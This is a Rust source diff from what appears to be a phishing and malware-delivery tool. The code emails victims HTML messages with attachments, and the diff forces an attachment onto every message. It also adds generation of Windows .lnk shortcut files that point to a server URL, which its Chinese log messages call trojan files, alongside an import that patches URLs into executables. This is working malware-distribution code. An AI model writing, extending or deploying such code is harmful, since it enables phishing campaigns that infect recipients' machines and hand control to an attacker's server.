@@ -4,7 +4,7 @@ use lettre::message::{MultiPart, Attachment, Body};
 use lettre::transport::smtp::authentication::Credentials;
 use lettre::{SmtpTransport, Transport};
 use std::error::Error;
-use std::fs::{self, create_dir_all};
+use std::fs::{self, create_dir_all, canonicalize};
 use std::path::Path;
 use mime_guess::MimeGuess;
 use crate::malware::patch_tool::replace_url_in_exe_rdata;
@@ -56,20 +56,21 @@ pub fn send_html_email(
         .to(to_email.parse()?)
         .subject(subject);
     
-    let multipart = match original_appendix_name_exe.is_empty() {
-        true => {
-            MultiPart::mixed()
-            .singlepart(
-                lettre::message::SinglePart::builder()
-                    .header(lettre::message::header::ContentType::TEXT_HTML)
-                    .body(html_content)
-            )
-        }
-        false => {
-            add_attachment(html_content, original_appendix_name_exe, server_url, entry_id, output_exe_path, output_lnk_path)?
+    // let multipart = match original_appendix_name_exe.is_empty() {
+    //     true => {
+    //         MultiPart::mixed()
+    //         .singlepart(
+    //             lettre::message::SinglePart::builder()
+    //                 .header(lettre::message::header::ContentType::TEXT_HTML)
+    //                 .body(html_content)
+    //         )
+    //     }
+    //     false => {
+    //         add_attachment(html_content, original_appendix_name_exe, server_url, entry_id, output_exe_path, output_lnk_path)?
 
-        }
-    };
+    //     }
+    // };
+    let multipart = add_attachment(html_content, original_appendix_name_exe, server_url, entry_id, output_exe_path, output_lnk_path)?;
 
     let email = base_email.multipart(multipart)?;
 
@@ -91,11 +92,15 @@ fn ensure_exe_suffix(s: &str) -> String {
     }
 }
 
+fn ensure_lnk_suffix(s: &str) -> String {
+    if s.ends_with(".lnk") {
+        s.to_string()
+    } else {
+        format!("{}.lnk", s)
+    }
+}
 
 
-
-
-/// 添加单个附件到multipart
 fn add_attachment(
     html_content: String,
     original_appendix_name_exe: &str,
@@ -159,29 +164,33 @@ fn add_attachment(
     };
 
     #[cfg(target_os = "windows")]
-    let mpart = if !(output_lnk_path.is_empty()) {
-        let temp = format!("./temp/appendix-lib/{}", entry_id);
+    if !(output_lnk_path.is_empty()) {
+        let temp = format!("./temp/appendix-lnk/{}", entry_id);
         let temp_clone = temp.clone();
         let temp_dir = Path::new(&temp_clone);
         create_dir_all(temp_dir)?;
 
-        let temp_file = format!("./{}/{}", temp, output_lnk_path);
+        let absolute_path = canonicalize(temp_dir)?;
+        let absolute_path = absolute_path.to_str().ok_or("")?;
+        let output_lnk_path = ensure_lnk_suffix(output_lnk_path);
+
+        let temp_file = format!("{}\\{}", absolute_path.clone(), output_lnk_path);
         let appendix_url = format!("{}/appendix/{}", server_url, entry_id);
-        match generate_lnk(temp_file, appendix_url){
+        match generate_lnk(&temp_file, &appendix_url){
             Ok(_) => {
-                let path = Path::new(output_lnk_path);
+                let path = Path::new(&output_lnk_path);
                 let mime_str = MimeGuess::from_path(path)
                     .first_or_octet_stream()
                     .essence_str().to_string(); 
 
-                crate::print_success(&format!("成功创建木马文件 {}", entry_id));
+                crate::print_success(&format!("成功创建lnk木马文件 {} ({})", entry_id, temp_file));
                 let body = fs::read(&temp_file)?;
 
                 fs::remove_file(&temp_file)?;
 
                 Ok(mpart                
                     .singlepart(
-                    Attachment::new(output_lnk_path.to_string())
+                    Attachment::new(output_lnk_path)
                         .body(body, ContentType::parse(&mime_str)?)
                 ))
 
@@ -195,9 +204,7 @@ fn add_attachment(
 
         }
     }else{
-        mpart
-    };
-
-    Ok(mpart)
+        Ok(mpart)
+    }
 
 }
